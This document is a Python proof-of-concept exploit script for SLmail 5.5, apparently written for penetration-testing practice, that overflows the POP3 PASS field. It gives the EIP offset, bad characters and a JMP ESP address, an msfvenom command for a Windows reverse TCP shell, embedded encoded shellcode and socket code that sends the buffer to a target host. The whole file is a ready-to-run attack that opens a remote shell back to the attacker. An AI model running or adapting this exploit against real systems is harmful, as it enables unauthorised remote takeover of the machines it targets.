#!/bin/python

# SLmail PoC by Ananth aka she11z
# SLmail 5.5 download: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe

import socket
import sys

RHOST = '192.168.1.117' # Change this
RPORT = 110
buff_len = 3500

# Crashes at 2700
# EIP offset Exact match at offset 2602
# Bad Characters: "\x00\x0a\x0d"
# JMP ESP on SLMFC.DLL --->  0x5f4a358f ----> "\x8f\x35\x4a\x5f"
# msfvenom -p windows/shell_reverse_tcp LHOST=<your IP> LPORT=<port> -a x86 --platform windows -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai EXITFUNC=thread
# Shellcode size: 351 Bytes NOTE: Keep the buffer size maintained


shellcode = ("\xd9\xc2\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x32\x51\x75\x82\xb1"		# Change this
"\x52\x83\xea\xfc\x31\x42\x13\x03\x70\x42\x97\x77\x88\x8c\xd5"
"\x78\x70\x4d\xba\xf1\x95\x7c\xfa\x66\xde\x2f\xca\xed\xb2\xc3"
"\xa1\xa0\x26\x57\xc7\x6c\x49\xd0\x62\x4b\x64\xe1\xdf\xaf\xe7"
"\x61\x22\xfc\xc7\x58\xed\xf1\x06\x9c\x10\xfb\x5a\x75\x5e\xae"
"\x4a\xf2\x2a\x73\xe1\x48\xba\xf3\x16\x18\xbd\xd2\x89\x12\xe4"
"\xf4\x28\xf6\x9c\xbc\x32\x1b\x98\x77\xc9\xef\x56\x86\x1b\x3e"
"\x96\x25\x62\x8e\x65\x37\xa3\x29\x96\x42\xdd\x49\x2b\x55\x1a"
"\x33\xf7\xd0\xb8\x93\x7c\x42\x64\x25\x50\x15\xef\x29\x1d\x51"
"\xb7\x2d\xa0\xb6\xcc\x4a\x29\x39\x02\xdb\x69\x1e\x86\x87\x2a"
"\x3f\x9f\x6d\x9c\x40\xff\xcd\x41\xe5\x74\xe3\x96\x94\xd7\x6c"
"\x5a\x95\xe7\x6c\xf4\xae\x94\x5e\x5b\x05\x32\xd3\x14\x83\xc5"
"\x14\x0f\x73\x59\xeb\xb0\x84\x70\x28\xe4\xd4\xea\x99\x85\xbe"
"\xea\x26\x50\x10\xba\x88\x0b\xd1\x6a\x69\xfc\xb9\x60\x66\x23"
"\xd9\x8b\xac\x4c\x70\x76\x27\xb3\x2d\x79\xdd\x5b\x2c\x79\x30"
"\xc0\xb9\x9f\x58\xe8\xef\x08\xf5\x91\xb5\xc2\x64\x5d\x60\xaf"
"\xa7\xd5\x87\x50\x69\x1e\xed\x42\x1e\xee\xb8\x38\x89\xf1\x16"
"\x54\x55\x63\xfd\xa4\x10\x98\xaa\xf3\x75\x6e\xa3\x91\x6b\xc9"
"\x1d\x87\x71\x8f\x66\x03\xae\x6c\x68\x8a\x23\xc8\x4e\x9c\xfd"
"\xd1\xca\xc8\x51\x84\x84\xa6\x17\x7e\x67\x10\xce\x2d\x21\xf4"
"\x97\x1d\xf2\x82\x97\x4b\x84\x6a\x29\x22\xd1\x95\x86\xa2\xd5"
"\xee\xfa\x52\x19\x25\xbf\x73\xf8\xef\xca\x1b\xa5\x7a\x77\x46"
"\x56\x51\xb4\x7f\xd5\x53\x45\x84\xc5\x16\x40\xc0\x41\xcb\x38"
"\x59\x24\xeb\xef\x5a\x6d")

buffer = "A" * 2602 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C" * (buff_len-2602-4-351-16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "Sending Buffer ...."
	s.connect((RHOST,RPORT))
	s.recv(1024)
	s.send('USER test \r\n')
	s.recv(1024)
	s.send('PASS test' + buffer)
	s.send('QUIT\r\n')
	print "Done! Try Harder!! By she11z..."

except:
	print "Error connecting server"

s.close()


